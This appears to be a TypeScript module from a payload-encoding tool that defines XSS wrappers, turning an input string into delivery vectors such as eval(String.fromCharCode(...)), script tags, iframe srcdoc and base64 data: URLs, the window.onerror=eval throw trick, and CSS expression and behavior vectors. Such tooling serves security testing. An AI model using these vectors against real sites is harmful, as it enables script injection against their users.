import { bytesToBase64, utf8ToBytes } from "../codec";
import type { TagDef } from "../types";
import { tag } from "./define";

// XSS payload constructors — wrap the input in a delivery vector.
export const xssTags: TagDef[] = [
  tag("XSS", "eval_fromcharcode", "eval(String.fromCharCode(...))", (s) => {
    // iterate UTF-16 code units: String.fromCharCode rebuilds surrogate pairs
    const codes: number[] = [];
    for (let i = 0; i < s.length; i++) codes.push(s.charCodeAt(i));
    return `eval(String.fromCharCode(${codes.join(",")}))`;
  }),
  tag("XSS", "script_data", "Wrap in <script> tags", (s) => `<script>${s}</script>`),
  tag("XSS", "uppercase_script", "Uppercase <SCRIPT> wrapper", (s) =>
    `<SCRIPT>${s}</SCRIPT>`,
  ),
  tag("XSS", "iframe_src_doc", "iframe srcdoc payload", (s) =>
    `<iframe srcdoc="${s.replace(/"/g, "&quot;")}"></iframe>`,
  ),
  tag("XSS", "iframe_data_url", "iframe with data: URL", (s) => {
    const b64 = bytesToBase64(utf8ToBytes(s));
    return `<iframe src="data:text/html;base64,${b64}"></iframe>`;
  }),
  tag("XSS", "throw_eval", "window.onerror=eval;throw payload", (s) =>
    `window.onerror=eval;throw'=${s}'`,
  ),
  tag("XSS", "template_eval", "Template literal eval", (s) => `\${${s}}`),
  tag("XSS", "css_expression", "CSS expression() vector", (s) =>
    `expression(${s})`,
  ),
  tag("XSS", "behavior", "CSS behavior vector", (s) =>
    `behavior:url(${s})`,
  ),
  tag("XSS", "datasrc", "datasrc/datafld vector", (s) =>
    `datasrc="${s}" datafld="payload"`,
  ),
];
